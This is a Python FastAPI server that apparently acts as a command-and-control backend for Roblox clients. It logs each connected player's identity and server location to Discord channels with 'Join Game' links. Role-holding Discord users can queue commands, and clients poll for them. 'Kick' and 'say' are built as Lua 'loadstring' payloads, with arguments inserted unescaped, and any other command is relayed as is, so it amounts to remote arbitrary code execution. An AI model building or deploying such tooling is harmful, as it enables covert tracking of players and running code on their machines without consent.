import os
import requests
from fastapi import FastAPI, Request, HTTPException
from pydantic import BaseModel
from typing import List, Dict
import uvicorn

app = FastAPI()
token = os.getenv("DISCORD_BOT_TOKEN")
guild_id = os.getenv("DISCORD_GUILD_ID")
category_id = os.getenv("DISCORD_USERS_CATEGORY_ID")
allowed_role_id = os.getenv("DISCORD_ALLOWED_ROLE_ID")
log_channel_id = "1393717563304710247"
headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
user_channels = {}
cmd_queue: Dict[str, List[Dict[str, str]]] = {}

def log_to_discord(text):
    requests.post(
        f"https://discord.com/api/v10/channels/{log_channel_id}/messages",
        headers=headers,
        json={"content": f"[LOG] {text}"}
    )

class Info(BaseModel):
    userid: str
    username: str
    displayname: str
    game: str
    placeid: str
    jobid: str
    thumbnail: str

class Disconnect(BaseModel):
    userid: str

@app.post("/info_report")
async def info_report(info: Info):
    if info.userid not in user_channels:
        payload = {"name": info.userid, "type": 0, "parent_id": category_id}
        r = requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json=payload)
        if r.status_code == 201:
            channel_id = r.json()["id"]
            user_channels[info.userid] = channel_id
            requests.post(
                f"https://discord.com/api/v10/channels/{channel_id}/messages",
                headers=headers,
                json={
        "content": f"<@&{allowed_role_id}> online",
        "embeds": [{
            "title": "Player Info",
            "color": 5763719,
            "thumbnail": {"url": info.thumbnail},
            "fields": [
                {"name": "Username", "value": info.username, "inline": True},
                {"name": "Display Name", "value": info.displayname, "inline": True},
                {"name": "User ID", "value": info.userid, "inline": False},
                {"name": "Game", "value": info.game, "inline": False},
                {"name": "Place ID", "value": info.placeid, "inline": False},
                {"name": "Job ID", "value": info.jobid, "inline": False}
            ],
            "footer": {"text": "IQSM Bot • Auto Logger"}
        }],
        "components": [{
            "type": 1,
            "components": [
                {
                    "type": 2,
                    "style": 5,
                    "label": "User Profile",
                    "url": f"https://www.roblox.com/users/{info.userid}/profile"
                },
                {
                    "type": 2,
                    "style": 5,
                    "label": "Join Game",
                    "url": f"roblox://join?placeId={info.placeid}&jobId={info.jobid}"
                }
            ]
        }]
    }
            )
        else:
            log_to_discord(f"Failed to create channel for {info.userid}: {r.text}")
            return {"error": "channel creation failed"}
    else:
        channel_id = user_channels[info.userid]

    embed = {
        "title": "Player Info",
        "color": 5763719,
        "thumbnail": {"url": info.thumbnail},
        "fields": [
            {"name": "Username", "value": info.username, "inline": True},
            {"name": "Display Name", "value": info.displayname, "inline": True},
            {"name": "User ID", "value": info.userid, "inline": True},
            {"name": "Game", "value": info.game, "inline": False},
            {"name": "Place ID", "value": info.placeid, "inline": True},
            {"name": "Job ID", "value": info.jobid, "inline": False}
        ]
    }

    components = [
        {
            "type": 1,
            "components": [
                {
                    "type": 2,
                    "style": 5,
                    "label": "View Profile",
                    "url": f"https://www.roblox.com/users/{info.userid}/profile"
                },
                {
                    "type": 2,
                    "style": 5,
                    "label": "Join Game",
                    "url": f"roblox://placeID={info.placeid}&gameInstanceId={info.jobid}"
                }
            ]
        }
    ]

    requests.post(
        f"https://discord.com/api/v10/channels/{channel_id}/messages",
        headers=headers,
        json={"embeds": [embed], "components": components}
    )

    return {"status": "ok"}

@app.get("/poll/{userid}")
async def poll(userid: str):
    return cmd_queue.pop(userid, [])

@app.post("/disconnect")
async def disconnect(info: Disconnect):
    if info.userid in user_channels:
        channel_id = user_channels[info.userid]
        requests.post(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            headers=headers,
            json={"content": "offline (deleting ts)"}
        )
        requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)
        user_channels.pop(info.userid, None)
    cmd_queue.pop(info.userid, None)
    return {"status": "ok"}

@app.post("/send_command/{userid}")
async def send_command(userid: str, request: Request):
    auth = request.headers.get("Authorization")
    if not auth or not auth.startswith("Bot "):
        raise HTTPException(status_code=401)
    requester = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": auth}).json()
    if "id" not in requester:
        raise HTTPException(status_code=403)
    r = requests.get(f"https://discord.com/api/v10/users/@me/guilds", headers={"Authorization": auth}).json()
    is_allowed = False
    for g in r:
        if g["id"] == guild_id:
            member = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members/{requester['id']}", headers=headers).json()
            if "roles" in member and allowed_role_id in member["roles"]:
                is_allowed = True
            break
    if not is_allowed:
        raise HTTPException(status_code=403)
    cmd = await request.json()
    if cmd.get("command") == "resetdb":
        user_channels.pop(userid, None)
        cmd_queue.pop(userid, None)
        log_to_discord(f"{userid} reset database")
    elif cmd.get("command") == "deletechan":
        if userid in user_channels:
            cid = user_channels[userid]
            requests.delete(f"https://discord.com/api/v10/channels/{cid}", headers=headers)
            log_to_discord(f"{userid}'s channel deleted manually")
            user_channels.pop(userid, None)
    elif cmd.get("command") == "log":
        log_to_discord(cmd.get("args", ""))
    elif cmd.get("command") == "kick":
        if userid not in cmd_queue: cmd_queue[userid] = []
        cmd_queue[userid].append({
            "command": "loadstring",
            "args": f'game:GetService("Players").LocalPlayer:Kick("{cmd.get("args", "Kicked")}")'
        })
    elif cmd.get("command") == "say":
        if userid not in cmd_queue: cmd_queue[userid] = []
        cmd_queue[userid].append({
            "command": "loadstring",
            "args": f'game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{cmd.get("args", "")}", "All")'
        })
    else:
        if userid not in cmd_queue:
            cmd_queue[userid] = []
        cmd_queue[userid].append(cmd)
    return {"status": "command queued"}

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000)
